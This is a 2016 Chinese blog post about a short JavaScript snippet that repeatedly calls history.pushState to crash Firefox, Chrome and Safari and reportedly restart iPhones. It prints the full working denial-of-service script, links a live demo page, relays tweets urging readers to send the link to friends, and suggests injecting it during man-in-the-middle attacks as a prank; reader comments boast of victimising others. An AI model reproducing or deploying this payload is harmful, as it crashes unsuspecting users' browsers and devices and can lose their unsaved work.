<h1 id="title">HTML5新特性Bug：这12行代码分分钟让你浏览器崩溃iPhone重启</h1>
<time id="date" datetime="2016-02-15T17:38:37+08:00">2016-02-15 17:38</time>
<section id="content">
    <p>
        <strong
            >使用这十二行JavaScript代码能让firefox、chrome、safari等众多浏览器崩溃，甚至让iPhone重启？</strong
        >
    </p>
    <p>
        <a
            href="https://laod.cn/wp-content/uploads/2016/02/xiasibaobaole.jpg"
            rel="attachment wp-att-1606"
            ><noscript
                ><img
                    class="alignnone size-full wp-image-1606"
                    src="https://laod.cn/wp-content/uploads/2016/02/xiasibaobaole.jpg"
                    alt="吓死本宝宝了"
                    width="640"
                    height="300" /></noscript
            ><img
                class="alignnone size-full wp-image-1606 j-lazy"
                src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20640%20300'%3E%3C/svg%3E"
                data-original="https://laod.cn/wp-content/uploads/2016/02/xiasibaobaole.jpg"
                alt="吓死本宝宝了"
                width="640"
                height="300"
                data-lazy-src="https://laod.cn/wp-content/themes/justnews/themer/assets/images/lazy.png" /><noscript
                ><img
                    class="alignnone size-full wp-image-1606 j-lazy"
                    src="https://laod.cn/wp-content/themes/justnews/themer/assets/images/lazy.png"
                    data-original="https://laod.cn/wp-content/uploads/2016/02/xiasibaobaole.jpg"
                    alt="吓死本宝宝了"
                    width="640"
                    height="300" /></noscript
        ></a>
    </p>
    <p><strong>起因</strong></p>
    <p>
        <strong>今天刷推特的时候发现Cyber Security</strong
        ><a href="https://twitter.com/cyber__sec" target="_blank"
            ><strong>@cyber__sec</strong></a
        ><strong>的推文让人眼前一亮：</strong>
    </p>
    <pre
        class="brush:html;toolbar:false"
    >Crash firefox, chrome, safari browsers, and also restart iPhone using this javascript code. #dos #0day #exploit
//使用下面这段JavaScript代码能让firefox，chrome，safari浏览器崩溃，而且还能让iPhone重启。
<a href="https://laod.cn/wp-content/uploads/2016/02/Cyber-Security.jpg" rel="attachment wp-att-1603"><noscript><img class="alignnone size-full wp-image-1603" src="https://laod.cn/wp-content/uploads/2016/02/Cyber-Security.jpg" alt="Cyber Security" width="585" height="474" /></noscript><img class="alignnone size-full wp-image-1603 j-lazy" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20585%20474'%3E%3C/svg%3E" data-original="https://laod.cn/wp-content/uploads/2016/02/Cyber-Security.jpg" alt="Cyber Security" width="585" height="474" data-lazy-src="https://laod.cn/wp-content/themes/justnews/themer/assets/images/lazy.png"><noscript><img class="alignnone size-full wp-image-1603 j-lazy" src="https://laod.cn/wp-content/themes/justnews/themer/assets/images/lazy.png" data-original="https://laod.cn/wp-content/uploads/2016/02/Cyber-Security.jpg" alt="Cyber Security" width="585" height="474" /></noscript></a></pre>
    <p>
        继续在推特上深挖发现IT Security Tweets ™
        <a href="https://twitter.com/F1r3h4nd" target="_blank">@F1r3h4nd</a>
        于17日发推：
    </p>
    <pre
        class="brush:html;toolbar:false"
    >Crash your friend's browser and restart iPhone with a link which has this script: #0day
//把带有下面这个脚本的链接发给你的朋友，能让你朋友的浏览器崩溃，而且让iPhone重启。
<a href="https://laod.cn/wp-content/uploads/2016/02/Crash-your-friends-browser-and-restart-iPhone-with-a-link-which-has-this-script-0day.jpg" rel="attachment wp-att-1604"><noscript><img class="alignnone size-full wp-image-1604" src="https://laod.cn/wp-content/uploads/2016/02/Crash-your-friends-browser-and-restart-iPhone-with-a-link-which-has-this-script-0day.jpg" alt="Crash your friend's browser and restart iPhone with a link which has this script: #0day" width="580" height="405" /></noscript><img class="alignnone size-full wp-image-1604 j-lazy" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20580%20405'%3E%3C/svg%3E" data-original="https://laod.cn/wp-content/uploads/2016/02/Crash-your-friends-browser-and-restart-iPhone-with-a-link-which-has-this-script-0day.jpg" alt="Crash your friend's browser and restart iPhone with a link which has this script: #0day" width="580" height="405" data-lazy-src="https://laod.cn/wp-content/themes/justnews/themer/assets/images/lazy.png"><noscript><img class="alignnone size-full wp-image-1604 j-lazy" src="https://laod.cn/wp-content/themes/justnews/themer/assets/images/lazy.png" data-original="https://laod.cn/wp-content/uploads/2016/02/Crash-your-friends-browser-and-restart-iPhone-with-a-link-which-has-this-script-0day.jpg" alt="Crash your friend's browser and restart iPhone with a link which has this script: #0day" width="580" height="405" /></noscript></a></pre>
    <p>
        <strong>完整HTML代码如下：</strong><br />[cc lang=”html”]<br /><br /><br />
        <script>
            var total = "";
            for (var i = 0; i < 1000000; i++) {
                total = total + i.toString();
                history.pushState(0, 0, total);
            }
        </script>
        <br /><br /><br />[/cc]
    </p>
    <p><strong>demo：（温馨提示：请保存浏览器其它窗口的编辑任务）</strong></p>
    <p>
        <a href="http://www.0xroot.cn/demo.html" target="_blank"
            >www.0xroot.cn/demo.html</a
        >
        (点击一下，又不会怀孕！)
    </p>
    <p><strong>接来下会发生什么？</strong></p>
    <p>点开以后，我的状态是这样的：</p>
    <p>
        <noscript
            ><img
                title="崩溃"
                src="http://image.3001.net/images/20160120/14532972774931.gif!small"
                alt="HTML5新特性Bug：这12行代码分分钟让你浏览器崩溃iPhone重启"
                width="150"
                height="107"
                border="0"
                hspace="0"
                vspace="0" /></noscript
        ><img
            title="崩溃"
            class="j-lazy"
            src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%20107'%3E%3C/svg%3E"
            data-original="http://image.3001.net/images/20160120/14532972774931.gif!small"
            alt="HTML5新特性Bug：这12行代码分分钟让你浏览器崩溃iPhone重启"
            width="150"
            height="107"
            border="0"
            hspace="0"
            vspace="0"
            data-lazy-src="https://laod.cn/wp-content/themes/justnews/themer/assets/images/lazy.png"
        /><noscript
            ><img
                title="崩溃"
                class="j-lazy"
                src="https://laod.cn/wp-content/themes/justnews/themer/assets/images/lazy.png"
                data-original="http://image.3001.net/images/20160120/14532972774931.gif!small"
                alt="HTML5新特性Bug：这12行代码分分钟让你浏览器崩溃iPhone重启"
                width="150"
                height="107"
                border="0"
                hspace="0"
                vspace="0"
        /></noscript>
    </p>
    <p>
        如果你是PC端用户，点开链接以后，电脑CPU内存极有可能一路狂飙直至浏览器崩溃卡死！
    </p>
    <p>
        如果你是移动端（安卓、iPhone）用户，点开链接以后你的浏览器会闪退！在微博、微信客户端点开链接同样会闪退。至于在推文中提到的让iPhone重启，这一现象倒是没有出现。<strong
            >22：49
            修正：iPhone用Safari打开之后链接之后，手机注销重启了！…</strong
        >
    </p>
    <p><strong>思考</strong></p>
    <p>这是Bug还是0day?为什么会有这一现象？如何实现的？</p>
    <p>
        有哪些比较有意思的利用姿势？（我先来个:当在执行MITM中间人攻击的时候，可以注入这一段js，来个恶搞整蛊。然后都懂的...）
    </p>
    <p>
        欢迎大家在评论中发表自己的观点
        <noscript
            ><img
                class="wp-smiley"
                src="http://www.spriteking.com/wp-content/themes/Hcms%201.2/images/smilies/icon_smile.gif"
                alt=":)" /></noscript
        ><img
            class="wp-smiley j-lazy"
            src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"
            data-original="http://www.spriteking.com/wp-content/themes/Hcms%201.2/images/smilies/icon_smile.gif"
            alt=":)"
            data-lazy-src="https://laod.cn/wp-content/themes/justnews/themer/assets/images/lazy.png"
        /><noscript
            ><img
                class="wp-smiley j-lazy"
                src="https://laod.cn/wp-content/themes/justnews/themer/assets/images/lazy.png"
                data-original="http://www.spriteking.com/wp-content/themes/Hcms%201.2/images/smilies/icon_smile.gif"
                alt=":)"
        /></noscript>
    </p>
    <p><strong>demo页面流量</strong>：</p>
    <p>
        <a
            href="https://laod.cn/wp-content/uploads/2016/02/demo.jpg"
            rel="attachment wp-att-1605"
            ><noscript
                ><img
                    class="alignnone size-full wp-image-1605"
                    src="https://laod.cn/wp-content/uploads/2016/02/demo.jpg"
                    alt="demo"
                    width="1032"
                    height="215" /></noscript
            ><img
                class="alignnone size-full wp-image-1605 j-lazy"
                src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201032%20215'%3E%3C/svg%3E"
                data-original="https://laod.cn/wp-content/uploads/2016/02/demo.jpg"
                alt="demo"
                width="1032"
                height="215"
                data-lazy-src="https://laod.cn/wp-content/themes/justnews/themer/assets/images/lazy.png" /><noscript
                ><img
                    class="alignnone size-full wp-image-1605 j-lazy"
                    src="https://laod.cn/wp-content/themes/justnews/themer/assets/images/lazy.png"
                    data-original="https://laod.cn/wp-content/uploads/2016/02/demo.jpg"
                    alt="demo"
                    width="1032"
                    height="215" /></noscript
        ></a>
    </p>
    <p><strong>微博评论/讨论摘取</strong></p>
    <pre
        class="brush:html;toolbar:false"
    ><a class="__yjs_email__" href="/cdn-cgi/l/email-protection" data-yjsemail="c2245f672a4568277c6c274f5825566a244a7582274f43277b7625616a267a42274367255846245e42267f712a6d462a6c78">[email&nbsp;protected]</a><script data-yjshash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-yjshash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-yjsemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>：感谢……我的iPhone电源键坏掉了，一直不知道如何关机和重启，这个网址好啊。。。                        
怀孕了...
好有趣...
好可怕...
整蛊不错
我已祸害了好多人（卖萌脸(づ￣ 3￣)づ）
崩溃了
火狐假死10秒后弹窗提示脚本无响应可停止难道是history的栈溢出么？
可以可以，新姿势get√
JS是世界上最好的语言！
hist.pushState是干嘛用的？
电脑正在重启
不能只让我一个人中招
我为什么会手贱？
Chrome隐身模式没有问题啊</pre>
    <div class="entry-copyright">
        <p>
            原创文章，作者：老D，如若转载，请注明出处：https://laod.cn/code-audit/html5-bug-crash-firefox-chrome-safari-browsers-and-also-restart-iphone-using-this-javascript-code-dos-0day-exploit.html
        </p>
    </div>
</section>
